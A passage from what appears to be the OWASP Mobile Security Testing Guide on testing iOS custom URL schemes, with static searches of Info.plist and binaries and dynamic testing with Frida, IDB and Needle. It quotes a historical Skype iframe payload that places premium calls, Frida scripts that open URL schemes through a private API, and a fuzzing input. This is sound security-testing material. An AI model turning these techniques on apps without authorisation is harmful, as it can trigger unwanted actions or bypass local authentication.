        \StringTok{"public.url"}\NormalTok{ = }\StringTok{"https://codeshare.frida.re/"}\NormalTok{;}
        \StringTok{"public.utf8{-}plain{-}text"}\NormalTok{ = }\StringTok{"https://codeshare.frida.re/"}\NormalTok{;}
    \KeywordTok{\}}
\KeywordTok{)}
\NormalTok{[}\ExtensionTok{*}\NormalTok{ Pasteboard changed] count: 66 hasStrings: false hasURLs: false hasImages: true}
\KeywordTok{(}
    \KeywordTok{\{}
        \StringTok{"com.apple.uikit.image"}\NormalTok{ = }\StringTok{"<UIImage: 0x1c42b23c0> size \{571, 264\} orientation 0 scale 1.000000"}\NormalTok{;}
        \StringTok{"public.jpeg"}\NormalTok{ = }\StringTok{"<UIImage: 0x1c44a1260> size \{571, 264\} orientation 0 scale 1.000000"}\NormalTok{;}
        \StringTok{"public.png"}\NormalTok{ = }\StringTok{"<UIImage: 0x1c04aaaa0> size \{571, 264\} orientation 0 scale 1.000000"}\NormalTok{;}
    \KeywordTok{\}}
\KeywordTok{)}
\end{Highlighting}
\end{Shaded}

You see that first a text was copied including the string ``hola'',
after that a URL was copied and finally a picture was copied. Some of
them are available via different UTIs. Other apps will consider these
UTIs to allow pasting of this data or not.

\hypertarget{testing-custom-url-schemes-mstg-platform-3-1}{%
\subsubsection{Testing Custom URL Schemes
(MSTG-PLATFORM-3)}\label{testing-custom-url-schemes-mstg-platform-3-1}}

\hypertarget{overview-64}{%
\paragraph{Overview}\label{overview-64}}

Custom URL schemes
\href{https://developer.apple.com/library/content/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/Inter-AppCommunication/Inter-AppCommunication.html\#//apple_ref/doc/uid/TP40007072-CH6-SW1}{allow
apps to communicate via a custom protocol}. An app must declare support
for the schemes and handle incoming URLs that use those schemes.

Apple warns about the improper use of custom URL schemes in the
\href{https://developer.apple.com/documentation/uikit/core_app/allowing_apps_and_websites_to_link_to_your_content/defining_a_custom_url_scheme_for_your_app}{Apple
Developer Documentation}:

\begin{quote}
URL schemes offer a potential attack vector into your app, so make sure
to validate all URL parameters and discard any malformed URLs. In
addition, limit the available actions to those that do not risk the
user's data. For example, do not allow other apps to directly delete
content or access sensitive information about the user. When testing
your URL-handling code, make sure your test cases include improperly
formatted URLs.
\end{quote}

They also suggest using universal links instead, if the purpose is to
implement deep linking:

\begin{quote}
While custom URL schemes are an acceptable form of deep linking,
universal links are strongly recommended as a best practice.
\end{quote}

Supporting a custom URL scheme is done by:

\begin{itemize}
\tightlist
\item
  defining the format for the app's URLs,
\item
  registering the scheme so that the system directs appropriate URLs to
  the app,
\item
  handling the URLs that the app receives.
\end{itemize}

Security issues arise when an app processes calls to its URL scheme
without properly validating the URL and its parameters and when users
aren't prompted for confirmation before triggering an important action.

One example is the following
\href{http://www.dhanjani.com/blog/2010/11/insecure-handling-of-url-schemes-in-apples-ios.html}{bug
in the Skype Mobile app}, discovered in 2010: The Skype app registered
the \texttt{skype://} protocol handler, which allowed other apps to
trigger calls to other Skype users and phone numbers. Unfortunately,
Skype didn't ask users for permission before placing the calls, so any
app could call arbitrary numbers without the user's knowledge. Attackers
exploited this vulnerability by putting an invisible
\texttt{\textless{}iframe\ src="skype://xxx?call"\textgreater{}\textless{}/iframe\textgreater{}}
(where \texttt{xxx} was replaced by a premium number), so any Skype user
who inadvertently visited a malicious website called the premium number.

As a developer, you should carefully validate any URL before calling it.
You can whitelist applications which may be opened via the registered
protocol handler. Prompting users to confirm the URL-invoked action is
another helpful control.

All URLs are passed to the app delegate, either at launch time or while
the app is running or in the background. To handle incoming URLs, the
delegate should implement methods to:

\begin{itemize}
\tightlist
\item
  retrieve information about the URL and decide whether you want to open
  it,
\item
  open the resource specified by the URL.
\end{itemize}

More information can be found in the
\href{https://developer.apple.com/library/archive/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/Inter-AppCommunication/Inter-AppCommunication.html\#//apple_ref/doc/uid/TP40007072-CH6-SW13}{archived
App Programming Guide for iOS} and in the
\href{https://developer.apple.com/library/archive/documentation/Security/Conceptual/SecureCodingGuide/Articles/ValidatingInput.html}{Apple
Secure Coding Guide}.

In addition, an app may also want to send URL requests (aka. queries) to
other apps. This is done by:

\begin{itemize}
\tightlist
\item
  registering the application query schemes that the app wants to query,
\item
  optionally querying other apps to know if they can open a certain URL,
\item
  sending the URL requests.
\end{itemize}

All of this presents a wide attack surface that we will address in the
static and dynamic analysis sections.

\hypertarget{static-analysis-71}{%
\paragraph{Static Analysis}\label{static-analysis-71}}

There are a couple of things that we can do in the static analysis. In
the next sections we will see the following:

\begin{itemize}
\tightlist
\item
  Testing custom URL schemes registration
\item
  Testing application query schemes registration
\item
  Testing URL handling and validation
\item
  Testing URL requests to other apps
\item
  Testing for deprecated methods
\end{itemize}

\hypertarget{testing-custom-url-schemes-registration}{%
\subparagraph{Testing Custom URL Schemes
Registration}\label{testing-custom-url-schemes-registration}}

The first step to test custom URL schemes is finding out whether an
application registers any protocol handlers.

If you have the original source code and want to view registered
protocol handlers, simply open the project in Xcode, go to the
\textbf{Info} tab and open the \textbf{URL Types} section as presented
in the screenshot below:

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/95cff8add424bdeb2b14d8bcd415271271611314.png}
\caption{Images/Chapters/0x06h/URL\_scheme.png}
\end{figure}

Also in Xcode you can find this by searching for the
\texttt{CFBundleURLTypes} key in the app's \texttt{Info.plist} file
(example from \href{https://github.com/OWASP/iGoat-Swift}{iGoat-Swift}):

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<key>}\NormalTok{CFBundleURLTypes}\KeywordTok{</key>}
\KeywordTok{<array>}
    \KeywordTok{<dict>}
        \KeywordTok{<key>}\NormalTok{CFBundleURLName}\KeywordTok{</key>}
        \KeywordTok{<string>}\NormalTok{com.iGoat.myCompany}\KeywordTok{</string>}
        \KeywordTok{<key>}\NormalTok{CFBundleURLSchemes}\KeywordTok{</key>}
        \KeywordTok{<array>}
            \KeywordTok{<string>}\NormalTok{iGoat}\KeywordTok{</string>}
        \KeywordTok{</array>}
    \KeywordTok{</dict>}
\KeywordTok{</array>}
\end{Highlighting}
\end{Shaded}

In a compiled application (or IPA), registered protocol handlers are
found in the file \texttt{Info.plist} in the app bundle's root folder.
Open it and search for the \texttt{CFBundleURLSchemes} key, if present,
it should contain an array of strings (example from
\href{https://github.com/OWASP/iGoat-Swift}{iGoat-Swift}):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{grep {-}A 5 {-}nri urlsch Info.plist}
\NormalTok{Info.plist:45:    }\KeywordTok{<key>}\NormalTok{CFBundleURLSchemes}\KeywordTok{</key>}
\NormalTok{Info.plist{-}46{-}    }\KeywordTok{<array>}
\NormalTok{Info.plist{-}47{-}        }\KeywordTok{<string>}\NormalTok{iGoat}\KeywordTok{</string>}
\NormalTok{Info.plist{-}48{-}    }\KeywordTok{</array>}
\end{Highlighting}
\end{Shaded}

Once the URL scheme is registered, other apps can open the app that
registered the scheme, and pass parameters by creating appropriately
formatted URLs and opening them with the
\href{https://developer.apple.com/documentation/uikit/uiapplication/1648685-openurl?language=objc}{\texttt{openURL:options:completionHandler:}}
method.

Note from the
\href{https://developer.apple.com/library/archive/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/Inter-AppCommunication/Inter-AppCommunication.html\#//apple_ref/doc/uid/TP40007072-CH6-SW7}{App
Programming Guide for iOS}:

\begin{quote}
If more than one third-party app registers to handle the same URL
scheme, there is currently no process for determining which app will be
given that scheme.
\end{quote}

This could lead to a URL scheme hijacking attack (see page 136 in
{[}\#thiel2{]}).

\hypertarget{testing-application-query-schemes-registration}{%
\subparagraph{Testing Application Query Schemes
Registration}\label{testing-application-query-schemes-registration}}

Before calling the \texttt{openURL:options:completionHandler:} method,
apps can call
\href{https://developer.apple.com/documentation/uikit/uiapplication/1622952-canopenurl?language=objc}{\texttt{canOpenURL:}}
to verify that the target app is available. However, as this method was
being used by malicious app as a way to enumerate installed apps,
\href{https://developer.apple.com/documentation/uikit/uiapplication/1622952-canopenurl?language=objc\#discussion}{from
iOS 9.0 the URL schemes passed to it must be also declared} by adding
the \texttt{LSApplicationQueriesSchemes} key to the app's
\texttt{Info.plist} file and an array of up to 50 URL schemes.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<key>}\NormalTok{LSApplicationQueriesSchemes}\KeywordTok{</key>}
    \KeywordTok{<array>}
        \KeywordTok{<string>}\NormalTok{url\_scheme1}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{url\_scheme2}\KeywordTok{</string>}
    \KeywordTok{</array>}
\end{Highlighting}
\end{Shaded}

\texttt{canOpenURL} will always return \texttt{NO} for undeclared
schemes, whether or not an appropriate app is installed. However, this
restriction only applies to \texttt{canOpenURL}, \textbf{the
\texttt{openURL:options:completionHandler:} method will still open any
URL scheme, even if the \texttt{LSApplicationQueriesSchemes} array was
declared}, and return \texttt{YES} / \texttt{NO} depending on the
result.

As an example, Telegram declares in its
\href{https://github.com/TelegramMessenger/Telegram-iOS/blob/master/Telegram/Telegram-iOS/Info.plist\#L233}{\texttt{Info.plist}}
these Queries Schemes, among others:

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{<key>}\NormalTok{LSApplicationQueriesSchemes}\KeywordTok{</key>}
    \KeywordTok{<array>}
        \KeywordTok{<string>}\NormalTok{dbapi{-}3}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{instagram}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{googledrive}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{comgooglemaps{-}x{-}callback}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{foursquare}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{here{-}location}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{yandexmaps}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{yandexnavi}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{comgooglemaps}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{youtube}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{twitter}\KeywordTok{</string>}
\NormalTok{        ...}
\end{Highlighting}
\end{Shaded}

\hypertarget{testing-url-handling-and-validation}{%
\subparagraph{Testing URL Handling and
Validation}\label{testing-url-handling-and-validation}}

In order to determine how a URL path is built and validated, if you have
the original source code, you can search for the following methods:

\begin{itemize}
\tightlist
\item
  \texttt{application:didFinishLaunchingWithOptions:} method or
  \texttt{application:will-FinishLaunchingWithOptions:}: verify how the
  decision is made and how the information about the URL is retrieved.
\item
  \href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application?language=objc}{\texttt{application:openURL:options:}}:
  verify how the resource is being opened, i.e.~how the data is being
  parsed, verify the
  \href{https://developer.apple.com/documentation/uikit/uiapplication/openurloptionskey}{options},
  especially if the calling app
  (\href{https://developer.apple.com/documentation/uikit/uiapplication/openurloptionskey/1623128-sourceapplication}{\texttt{sourceApplication}})
  is being verified or checked against a white- or blacklist. The app
  might also need user permission when using the custom URL scheme.
\end{itemize}

In Telegram you will
\href{https://github.com/peter-iakovlev/Telegram-iOS/blob/87e0a33ac438c1d702f2a0b75bf21f26866e346f/Telegram-iOS/AppDelegate.swift\#L1250}{find
four different methods being used}:

\begin{verbatim}
func application(_ application: UIApplication, open url: URL, sourceApplication: String?) -> Bool {
    self.openUrl(url: url)
    return true
}

func application(_ application: UIApplication, open url: URL, sourceApplication: String?,
annotation: Any) -> Bool {
    self.openUrl(url: url)
    return true
}

func application(_ app: UIApplication, open url: URL,
options: [UIApplicationOpenURLOptionsKey : Any] = [:]) -> Bool {
    self.openUrl(url: url)
    return true
}

func application(_ application: UIApplication, handleOpen url: URL) -> Bool {
    self.openUrl(url: url)
    return true
}
\end{verbatim}

We can observe some things here:

\begin{itemize}
\tightlist
\item
  The app implements also deprecated methods like
  \href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622964-application?language=objc}{\texttt{application:handleOpenURL:}}
  and
  \href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application}{\texttt{application:openURL:sourceApplication:annotation:}}.
\item
  The source application is not being verified in any of those methods.
\item
  All of them call a private \texttt{openUrl} method. You can
  \href{https://github.com/peter-iakovlev/Telegram-iOS/blob/87e0a33ac438c1d702f2a0b75bf21f26866e346f/Telegram-iOS/AppDelegate.swift\#L1270}{inspect
  it} to learn more about how the URL request is handled.
\end{itemize}

\hypertarget{testing-url-requests-to-other-apps}{%
\subparagraph{Testing URL Requests to Other
Apps}\label{testing-url-requests-to-other-apps}}

The method
\href{https://developer.apple.com/documentation/uikit/uiapplication/1648685-openurl?language=objc}{\texttt{openURL:options:completionHandler:}}
and the
\href{https://developer.apple.com/documentation/uikit/uiapplication/1622961-openurl?language=objc}{deprecated
\texttt{openURL:} method of \texttt{UIApplication}} are responsible for
opening URLs (i.e.~to send requests / make queries to other apps) that
may be local to the current app or it may be one that must be provided
by a different app. If you have the original source code you can search
directly for usages of those methods.

Additionally, if you are interested into knowing if the app is querying
specific services or apps, and if the app is well-known, you can also
search for common URL schemes online and include them in your greps. For
example, a
\href{https://ios.gadgethacks.com/news/always-updated-list-ios-app-url-scheme-names-0184033/}{quick
Google search reveals}:

\begin{verbatim}
Apple Music — music:// or musics:// or audio-player-event://
Calendar — calshow:// or x-apple-calevent://
Contacts — contacts://
Diagnostics — diagnostics:// or diags://
GarageBand — garageband://
iBooks — ibooks:// or itms-books:// or itms-bookss://
Mail — message:// or mailto://emailaddress
Messages — sms://phonenumber
Notes — mobilenotes://
...
\end{verbatim}

We search for this method in the Telegram source code, this time without
using Xcode, just with \texttt{egrep}:

\begin{verbatim}
$ egrep -nr "open.*options.*completionHandler" ./Telegram-iOS/

./AppDelegate.swift:552: return UIApplication.shared.open(parsedUrl,
    options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],
    completionHandler: { value in
./AppDelegate.swift:556: return UIApplication.shared.open(parsedUrl,
    options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],
    completionHandler: { value in
\end{verbatim}

If we inspect the results we will see that
\texttt{openURL:options:completionHandler:} is actually being used for
universal links, so we have to keep searching. For example, we can
search for \texttt{openURL(}:

\begin{verbatim}
$ egrep -nr "openURL\(" ./Telegram-iOS/

./ApplicationContext.swift:763:  UIApplication.shared.openURL(parsedUrl)
./ApplicationContext.swift:792:  UIApplication.shared.openURL(URL(
                                        string: "https://telegram.org/deactivate?phone=\(phone)")!
                                 )
./AppDelegate.swift:423:         UIApplication.shared.openURL(url)
./AppDelegate.swift:538:         UIApplication.shared.openURL(parsedUrl)
...
\end{verbatim}

If we inspect those lines we will see how this method is also being used
to open ``Settings'' or to open the ``App Store Page''.

When just searching for \texttt{://} we see:

\begin{verbatim}
if documentUri.hasPrefix("file://"), let path = URL(string: documentUri)?.path {
if !url.hasPrefix("mt-encrypted-file://?") {
guard let dict = TGStringUtils.argumentDictionary(inUrlString: String(url[url.index(url.startIndex,
    offsetBy: "mt-encrypted-file://?".count)...])) else {
parsedUrl = URL(string: "https://\(url)")
if let url = URL(string: "itms-apps://itunes.apple.com/app/id\(appStoreId)") {
} else if let url = url as? String, url.lowercased().hasPrefix("tg://") {
[[WKExtension sharedExtension] openSystemURL:[NSURL URLWithString:[NSString
    stringWithFormat:@"tel://%@", userHandle.data]]];
\end{verbatim}

After combining the results of both searches and carefully inspecting
the source code we find the following piece of code:

\begin{verbatim}
openUrl: { url in
            var parsedUrl = URL(string: url)
            if let parsed = parsedUrl {
                if parsed.scheme == nil || parsed.scheme!.isEmpty {
                    parsedUrl = URL(string: "https://\(url)")
                }
                if parsed.scheme == "tg" {
                    return
                }
            }

            if let parsedUrl = parsedUrl {
                UIApplication.shared.openURL(parsedUrl)
\end{verbatim}

Before opening a URL, the scheme is validated, ``https'' will be added
if necessary and it won't open any URL with the ``tg'' scheme. When
ready it will use the deprecated \texttt{openURL} method.

If only having the compiled application (IPA) you can still try to
identify which URL schemes are being used to query other apps:

\begin{itemize}
\tightlist
\item
  Check if \texttt{LSApplicationQueriesSchemes} was declared or search
  for common URL schemes.
\item
  Also use the string \texttt{://} or build a regular expression to
  match URLs as the app might not be declaring some schemes.
\end{itemize}

You can do that by first verifying that the app binary contains those
strings by e.g.~using unix \texttt{strings} command:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\FunctionTok{strings} \OperatorTok{<}\NormalTok{yourapp}\OperatorTok{>} \KeywordTok{|} \FunctionTok{grep} \StringTok{"someURLscheme://"}
\end{Highlighting}
\end{Shaded}

or even better, use radare2's \texttt{iz/izz} command or rafind2, both
will find strings where the unix \texttt{strings} command won't. Example
from iGoat-Swift:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{r2}\NormalTok{ {-}qc izz\textasciitilde{}iGoat:// iGoat{-}Swift}
\ExtensionTok{37436}\NormalTok{ 0x001ee610 0x001ee610  23  24 (4.\_\_TEXT.\_\_cstring) }\ExtensionTok{ascii}\NormalTok{ iGoat://?contactNumber=}
\end{Highlighting}
\end{Shaded}

\hypertarget{testing-for-deprecated-methods}{%
\subparagraph{Testing for Deprecated
Methods}\label{testing-for-deprecated-methods}}

Search for deprecated methods like:

\begin{itemize}
\tightlist
\item
  \href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622964-application?language=objc}{\texttt{application:handleOpenURL:}}
\item
  \href{https://developer.apple.com/documentation/uikit/uiapplication/1622961-openurl?language=objc}{\texttt{openURL:}}
\item
  \href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application}{\texttt{application:openURL:sourceApplication:annotation:}}
\end{itemize}

For example, here we find those three:

\begin{verbatim}
$ rabin2 -zzq Telegram\ X.app/Telegram\ X | grep -i "openurl"

0x1000d9e90 31 30 UIApplicationOpenURLOptionsKey
0x1000dee3f 50 49 application:openURL:sourceApplication:annotation:
0x1000dee71 29 28 application:openURL:options:
0x1000dee8e 27 26 application:handleOpenURL:
0x1000df2c9 9 8 openURL:
0x1000df766 12 11 canOpenURL:
0x1000df772 35 34 openURL:options:completionHandler:
...
\end{verbatim}

\hypertarget{dynamic-analysis-67}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-67}}

Once you've identified the custom URL schemes the app has registered,
there are several methods that you can use to test them:

\begin{itemize}
\tightlist
\item
  Performing URL requests
\item
  Identifying and hooking the URL handler method
\item
  Testing URL schemes source validation
\item
  Fuzzing URL schemes
\end{itemize}

\hypertarget{performing-url-requests}{%
\subparagraph{Performing URL Requests}\label{performing-url-requests}}

Using Safari

To quickly test one URL scheme you can open the URLs on Safari and
observe how the app behaves. For example, if you write
\texttt{tel://123456789} in the address bar of Safari, a pop up will
appear with the \emph{telephone number} and the options ``Cancel'' and
``Call''. If you press ``Call'' it will open the Phone app and directly
make the call.

You may also know already about pages that trigger custom URL schemes,
you can just navigate normally to those pages and Safari will
automatically ask when it finds a custom URL scheme.

Using the Notes App

As already seen in ``Triggering Universal Links'', you may use the Notes
app and long press the links you've written in order to test custom URL
schemes. Remember to exit the editing mode in order to be able to open
them. Note that you can click or long press links including custom URL
schemes only if the app is installed, if not they won't be highlighted
as \emph{clickable links}.

Using Frida

If you simply want to open the URL scheme you can do it using Frida:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida }\OperatorTok{{-}}\NormalTok{U iGoat}\OperatorTok{{-}}\NormalTok{Swift}

\NormalTok{[iPhone}\OperatorTok{::}\NormalTok{iGoat}\OperatorTok{{-}}\NormalTok{Swift]}\OperatorTok{{-}>} \KeywordTok{function} \AttributeTok{openURL}\NormalTok{(url) }\OperatorTok{\{}
                            \KeywordTok{var}\NormalTok{ UIApplication }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}\VariableTok{UIApplication}\NormalTok{.}\AttributeTok{sharedApplication}\NormalTok{()}\OperatorTok{;}
                            \KeywordTok{var}\NormalTok{ toOpen }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}\VariableTok{NSURL}\NormalTok{.}\AttributeTok{URLWithString\_}\NormalTok{(url)}\OperatorTok{;}
                            \ControlFlowTok{return} \VariableTok{UIApplication}\NormalTok{.}\AttributeTok{openURL\_}\NormalTok{(toOpen)}\OperatorTok{;}
                        \OperatorTok{\}}
\NormalTok{[iPhone}\OperatorTok{::}\NormalTok{iGoat}\OperatorTok{{-}}\NormalTok{Swift]}\OperatorTok{{-}>} \AttributeTok{openURL}\NormalTok{(}\StringTok{"tel://234234234"}\NormalTok{)}
\KeywordTok{true}
\end{Highlighting}
\end{Shaded}

Or as in this example from
\href{https://codeshare.frida.re/@dki/ios-url-scheme-fuzzing/}{Frida
CodeShare} where the author uses the non-public API
\texttt{LSApplicationWorkspace.openSensitiveURL:withOptions:} to open
the URLs (from the SpringBoard app):

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{function} \AttributeTok{openURL}\NormalTok{(url) }\OperatorTok{\{}
    \KeywordTok{var}\NormalTok{ w }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}\VariableTok{LSApplicationWorkspace}\NormalTok{.}\AttributeTok{defaultWorkspace}\NormalTok{()}\OperatorTok{;}
    \KeywordTok{var}\NormalTok{ toOpen }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}\VariableTok{NSURL}\NormalTok{.}\AttributeTok{URLWithString\_}\NormalTok{(url)}\OperatorTok{;}
    \ControlFlowTok{return} \VariableTok{w}\NormalTok{.}\AttributeTok{openSensitiveURL\_withOptions\_}\NormalTok{(toOpen}\OperatorTok{,} \KeywordTok{null}\NormalTok{)}\OperatorTok{;}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\begin{quote}
Note that the use of non-public APIs is not permitted on the App Store,
that's why we don't even test these but we are allowed to use them for
our dynamic analysis.
\end{quote}

Using IDB

For this you can also use \href{https://www.idbtool.com/}{IDB}:

\begin{itemize}
\tightlist
\item
  Start IDB, connect to your device and select the target app. You can
  find details in the
  \href{https://www.idbtool.com/documentation/setup.html}{IDB
  documentation}.
\item
  Go to the \textbf{URL Handlers} section. In \textbf{URL schemes},
  click \textbf{Refresh}, and on the left you'll find a list of all
  custom schemes defined in the app being tested. You can load these
  schemes by clicking \textbf{Open}, on the right side. By simply
  opening a blank URI scheme (e.g., opening \texttt{myURLscheme://}),
  you can discover hidden functionality (e.g., a debug window) and
  bypass local authentication.
\end{itemize}

Using Needle

Needle can be used to test custom URL schemes, the following module can
be used to open the URLs (URIs):

\begin{verbatim}
[needle] >
[needle] > use dynamic/ipc/open_uri
[needle][open_uri] > show options

  Name  Current Value  Required  Description
  ----  -------------  --------  -----------
  URI                  yes       URI to launch, eg tel://123456789 or http://www.google.com/

[needle][open_uri] > set URI "myapp://testpayload'"
URI => "myapp://testpayload'"
[needle][open_uri] > run
\end{verbatim}

Manual fuzzing can be performed against the URL scheme to identify input
validation and memory corruption bugs.

\hypertarget{identifying-and-hooking-the-url-handler-method}{%
\subparagraph{Identifying and Hooking the URL Handler
Method}\label{identifying-and-hooking-the-url-handler-method}}

If you can't look into the original source code you will have to find
out yourself which method does the app use to handle the URL scheme
requests that it receives. You cannot know if it is an Objective-C
method or a Swift one, or even if the app is using a deprecated one.

Crafting the Link Yourself and Letting Safari Open It

For this we will use the
\href{https://codeshare.frida.re/@mrmacete/objc-method-observer/}{ObjC
method observer} from Frida CodeShare, which is an extremely handy
script that allows you to quickly observe any collection of methods or
classes just by providing a simple pattern.

In this case we are interested into all methods containing ``openURL'',
therefore our pattern will be \texttt{*{[}*\ *openURL*{]}}:

\begin{itemize}
\tightlist
\item
  The first asterisk will match all instance \texttt{-} and class
  \texttt{+} methods.
\item
  The second matches all Objective-C classes.
\item
  The third and forth allow to match any method containing the string
  \texttt{openURL}.
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida }\OperatorTok{{-}}\NormalTok{U iGoat}\OperatorTok{{-}}\NormalTok{Swift }\OperatorTok{{-}{-}}\NormalTok{codeshare mrmacete}\OperatorTok{/}\NormalTok{objc}\OperatorTok{{-}}\NormalTok{method}\OperatorTok{{-}}\NormalTok{observer}

\NormalTok{[iPhone}\OperatorTok{::}\NormalTok{iGoat}\OperatorTok{{-}}\NormalTok{Swift]}\OperatorTok{{-}>} \AttributeTok{observeSomething}\NormalTok{(}\StringTok{"*[* *openURL*]"}\NormalTok{)}\OperatorTok{;}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[\_UIDICActivityItemProvider activityViewController}\OperatorTok{:}\NormalTok{openURLAnnotationForActivityType}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[CNQuickActionsManager \_openURL}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[SUClientController openURL}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[SUClientController openURL}\OperatorTok{:}\NormalTok{inClientWithIdentifier}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[FBSSystemService openURL}\OperatorTok{:}\NormalTok{application}\OperatorTok{:}\NormalTok{options}\OperatorTok{:}\NormalTok{clientPort}\OperatorTok{:}\NormalTok{withResult}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[}\VariableTok{iGoat\_Swift}\NormalTok{.}\AttributeTok{AppDelegate}\NormalTok{ application}\OperatorTok{:}\NormalTok{openURL}\OperatorTok{:}\NormalTok{options}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[PrefsUILinkLabel openURL}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[UIApplication openURL}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[UIApplication \_openURL}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[UIApplication openURL}\OperatorTok{:}\NormalTok{options}\OperatorTok{:}\NormalTok{completionHandler}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[UIApplication openURL}\OperatorTok{:}\NormalTok{withCompletionHandler}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[UIApplication \_openURL}\OperatorTok{:}\NormalTok{originatingView}\OperatorTok{:}\NormalTok{completionHandler}\OperatorTok{:}\NormalTok{]}
\NormalTok{Observing  }\OperatorTok{{-}}\NormalTok{[SUApplication application}\OperatorTok{:}\NormalTok{openURL}\OperatorTok{:}\NormalTok{sourceApplication}\OperatorTok{:}\NormalTok{annotation}\OperatorTok{:}\NormalTok{]}
\NormalTok{...}
\end{Highlighting}
\end{Shaded}

The list is very long and includes the methods we have already
mentioned. If we trigger now one URL scheme, for example ``igoat://''
from Safari and accept to open it in the app we will see the following:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[iPhone}\OperatorTok{::}\NormalTok{iGoat}\OperatorTok{{-}}\NormalTok{Swift]}\OperatorTok{{-}>}\NormalTok{ (}\BaseNTok{0x1c4038280}\NormalTok{)  }\OperatorTok{{-}}\NormalTok{[}\VariableTok{iGoat\_Swift}\NormalTok{.}\AttributeTok{AppDelegate}\NormalTok{ application}\OperatorTok{:}\NormalTok{openURL}\OperatorTok{:}\NormalTok{options}\OperatorTok{:}\NormalTok{]}
\NormalTok{application}\OperatorTok{:} \OperatorTok{<}\NormalTok{UIApplication}\OperatorTok{:} \BaseNTok{0x101d0fad0}\OperatorTok{>}
\NormalTok{openURL}\OperatorTok{:}\NormalTok{ igoat}\OperatorTok{:}\CommentTok{//}
\NormalTok{options}\OperatorTok{:} \OperatorTok{\{}
\NormalTok{    UIApplicationOpenURLOptionsOpenInPlaceKey }\OperatorTok{=} \DecValTok{0}\OperatorTok{;}
\NormalTok{    UIApplicationOpenURLOptionsSourceApplicationKey }\OperatorTok{=} \StringTok{"com.apple.mobilesafari"}\OperatorTok{;}
\OperatorTok{\}}
\BaseNTok{0x18b5030d8}\NormalTok{ UIKit}\OperatorTok{!}\NormalTok{\_\_58}\OperatorTok{{-}}\NormalTok{[UIApplication \_applicationOpenURLAction}\OperatorTok{:}\NormalTok{payload}\OperatorTok{:}\NormalTok{origin}\OperatorTok{:}\NormalTok{]\_block\_invoke}
\BaseNTok{0x18b502a94}\NormalTok{ UIKit}\OperatorTok{!{-}}\NormalTok{[UIApplication \_applicationOpenURLAction}\OperatorTok{:}\NormalTok{payload}\OperatorTok{:}\NormalTok{origin}\OperatorTok{:}\NormalTok{]}
\NormalTok{...}
\BaseNTok{0x1817e1048} \VariableTok{libdispatch}\NormalTok{.}\AttributeTok{dylib}\OperatorTok{!}\NormalTok{\_dispatch\_client\_callout}
\BaseNTok{0x1817e86c8} \VariableTok{libdispatch}\NormalTok{.}\AttributeTok{dylib}\OperatorTok{!}\NormalTok{\_dispatch\_block\_invoke\_direct$VARIANT$mp}
\BaseNTok{0x18453d9f4}\NormalTok{ FrontBoardServices}\OperatorTok{!}\NormalTok{\_\_FBSSERIALQUEUE\_IS\_CALLING\_OUT\_TO\_A\_BLOCK\_\_}
\BaseNTok{0x18453d698}\NormalTok{ FrontBoardServices}\OperatorTok{!{-}}\NormalTok{[FBSSerialQueue \_performNext]}
